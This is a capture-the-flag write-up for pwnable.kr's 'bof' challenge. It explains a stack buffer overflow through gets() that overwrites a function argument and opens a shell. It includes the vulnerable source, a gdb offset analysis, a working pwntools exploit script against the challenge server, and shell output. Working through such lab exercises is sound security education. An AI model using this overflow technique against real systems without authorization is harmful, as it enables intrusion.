## Description
bof - 5 pt [writeup]

> Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?
>
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
>
> Running at : nc pwnable.kr 9000

## Solution
We are given a binary file `bof`, and it's source code `bof.c`. Let's take a look at the source code:
### bof.c
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
As we can see, when the program is executed regularly, it calls `func` with the argument `0xdeadbeef`, which is then compared to `0xcafebabe`.\
Because the arguments are different, the program will print `Nah..` and exit.
We need to find a way to make the program call `system("/bin/sh")` instead of `printf("Nah..")`.

We can see that the program calls `gets` to read input from the user.\
`gets` doesn't check the length of the input, so we can overflow the buffer `overflowme` and overwrite the `key` variable, which then will be compared to `0xcafebabe`.
Now we just need to find out how much we need to pad our input with to overwrite the `key` variable with `0xcafebabe`.

```shell
$ cyclic(64)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa'
$ gdb bof
pwndbg> disassemble func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   ....
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7de48b0 <_IO_gets> # gets is called here
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe # key is compared to 0xcafebabe here
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   ....
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
```
We can see that the `key` variable is located at `ebp+0x8`, and the `overflowme` buffer is located at `ebp-0x2c`.\
Meaning that we need to pad our input with `0x2c+0x8`, which is `52` bytes, to overwrite the `key` variable.

Let's try it out:
```python
from pwn import *

payl = b"\x61" * 52 + b"\xbe\xba\xfe\xca"

shell = remote("pwnable.kr",9000)
shell.send(payl)
shell.interactive()
```
and it works!
```shell
$ python3 exp.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
[ .......... ]
```
